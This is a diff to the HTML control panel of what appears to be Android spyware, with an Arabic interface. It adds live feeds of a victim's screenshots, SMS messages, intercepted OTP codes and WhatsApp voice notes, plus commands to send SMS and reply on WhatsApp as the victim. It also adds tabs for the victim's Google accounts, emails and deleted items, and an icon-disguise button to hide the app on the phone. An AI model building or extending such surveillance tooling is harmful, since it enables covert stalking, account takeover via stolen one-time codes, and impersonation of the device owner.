@@ -18,6 +18,36 @@
                 <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف</button>
                 <button onclick="logout()" class="logout-btn">خروج</button>
             </div>
+
+            <!-- ✅ أزرار الفيد الحي -->
+            <div style="display:flex;gap:12px;margin-top:15px;flex-wrap:wrap;justify-content:center;">
+                <button id="liveImagesBtn" onclick="openLiveImages()" style="background:linear-gradient(135deg,#00ffcc,#009977);color:#000;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(0,255,204,0.6);">
+                    🆕 الصور الفورية <span id="liveImagesCount" style="background:#000;color:#00ffcc;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
+                </button>
+                <button id="liveMsgsBtn" onclick="openLiveMessages()" style="background:linear-gradient(135deg,#ff0066,#cc0052);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(255,0,102,0.6);">
+                    🆕 الرسائل الفورية <span id="liveMsgsCount" style="background:#000;color:#ff0066;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
+                </button>
+                <button id="liveOtpBtn" onclick="openLiveOtp()" style="background:linear-gradient(135deg,#ffcc00,#cc9900);color:#000;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(255,204,0,0.6);">
+                    🔐 OTP <span id="liveOtpCount" style="background:#000;color:#ffcc00;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
+                </button>
+                <button id="liveVoicesBtn" onclick="openLiveVoices()" style="background:linear-gradient(135deg,#00ffcc,#006677);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(0,255,204,0.6);">
+                    🎤 صوتيات واتساب <span id="liveVoicesCount" style="background:#000;color:#00ffcc;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
+                </button>
+            </div>
+
+            <!-- ✅ أزرار الأوامر -->
+            <div style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap;justify-content:center;">
+                <button id="sendSmsBtn" onclick="openSendSms()" style="background:linear-gradient(135deg,#25D366,#128C7E);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(37,211,102,0.6);">
+                    📨 إرسال SMS
+                </button>
+                <button id="replyWaBtn" onclick="openReplyWaPicker()" style="background:linear-gradient(135deg,#128C7E,#075E54);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(18,140,126,0.6);">
+                    ↩️ رد واتساب
+                </button>
+                <!-- ✅ زر التنكر -->
+                <button id="disguiseBtn" onclick="openDisguiseMenu()" style="background:linear-gradient(135deg,#9b59b6,#8e44ad);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(155,89,182,0.6);">
+                    🎭 تغيير الأيقونة
+                </button>
+            </div>
         </header>
         
         <div class="status-bar">
@@ -34,6 +64,8 @@
             <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('deleted')">🗑️ المحذوفات <span id="deletedCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('whatsapp')">💬 واتساب <span id="whatsappCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('google')">📧 حسابات Google</button>
+            <button class="tab" onclick="switchTab('emails')">📧 البريد <span id="emailsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
         </div>
@@ -73,13 +105,32 @@
                 <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
             </div>
+
             <div id="deletedTab" class="tab-pane">
-                <h3>🗑️ سلة المحذوفات</h3>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
+                    <h3 style="margin:0;border:none;padding:0;">🗑️ سلة المحذوفات</h3>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                        <button onclick="filterDeleted('all')" id="delFilterAll" style="background:#00ffcc;color:#000;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">الكل</button>
+                        <button onclick="filterDeleted('call_log')" id="delFilterCall" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">📞 مكالمات</button>
+                        <button onclick="filterDeleted('sms')" id="delFilterSms" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">💬 رسائل</button>
+                        <button onclick="filterDeleted('image')" id="delFilterImg" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🖼️ صور</button>
+                        <button onclick="clearAllDeleted()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️ مسح الكل</button>
+                    </div>
+                </div>
                 <div id="deletedList"></div>
             </div>
+
             <div id="whatsappTab" class="tab-pane">
                 <h3>💬 رسائل واتساب</h3>
                 <div id="whatsappList"></div>
+            </div>
+            <div id="googleTab" class="tab-pane">
+                <h3>📧 حسابات Google</h3>
+                <div id="googleAccountsList"></div>
+            </div>
+            <div id="emailsTab" class="tab-pane">
+                <h3>📧 البريد الإلكتروني</h3>
+                <div id="emailsList"></div>
             </div>
             <div id="appsTab" class="tab-pane">
                 <h3>📱 التطبيقات</h3>
@@ -91,6 +142,66 @@
             </div>
         </div>
     </div>
+
+    <!-- ✅ نافذة الصور الفورية -->
+    <div id="liveImagesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">📸 الصور الفورية</h2>
+            <div>
+                <button onclick="clearLiveImages()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح الكل</button>
+                <button onclick="closeLiveImages()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveImagesGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;">
+            <p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة... خذ سكرين شوت أو استقبل صورة واتساب وراح تظهر هنا فوراً</p>
+        </div>
+    </div>
+
+    <!-- ✅ نافذة الرسائل الفورية -->
+    <div id="liveMsgsOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#ff0066;text-shadow:0 0 15px #ff0066;">💬 الرسائل الفورية</h2>
+            <div>
+                <button onclick="filterLiveMsgs('all')" id="filterAll" style="background:#ff0066;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;">الكل</button>
+                <button onclick="filterLiveMsgs('in')" id="filterIn" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📥 مستلمة</button>
+                <button onclick="filterLiveMsgs('out')" id="filterOut" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📤 مرسلة</button>
+                <button onclick="clearLiveMsgs()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">🗑️ مسح الكل</button>
+                <button onclick="closeLiveMessages()" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveMsgsList" style="display:flex;flex-direction:column;gap:10px;">
+            <p style="color:#666;text-align:center;padding:50px;">في انتظار رسائل جديدة... أرسل أو استقبل رسالة SMS وراح تظهر هنا فوراً</p>
+        </div>
+    </div>
+
+    <!-- ✅ نافذة OTP الفورية -->
+    <div id="liveOtpOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#ffcc00;text-shadow:0 0 15px #ffcc00;">🔐 أكواد OTP</h2>
+            <div>
+                <button onclick="clearLiveOtp()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح الكل</button>
+                <button onclick="closeLiveOtp()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveOtpList" style="display:flex;flex-direction:column;gap:12px;">
+            <p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد OTP بعد</p>
+        </div>
+    </div>
+
+    <!-- ✅ نافذة الرسائل الصوتية -->
+    <div id="liveVoicesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">🎤 الرسائل الصوتية</h2>
+            <div>
+                <button onclick="triggerVoiceScan()" style="background:#ffcc00;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-left:10px;">🔁 فحص المجلدات</button>
+                <button onclick="clearLiveVoices()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح الكل</button>
+                <button onclick="closeLiveVoices()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveVoicesList" style="display:flex;flex-direction:column;gap:12px;">
+            <p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل صوتية بعد</p>
+        </div>
+    </div>
     
     <script src="script.js"></script>
     <script>
@@ -98,4 +209,4 @@
     function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
     </script>
 </body>
-                    </html>
+                </html>
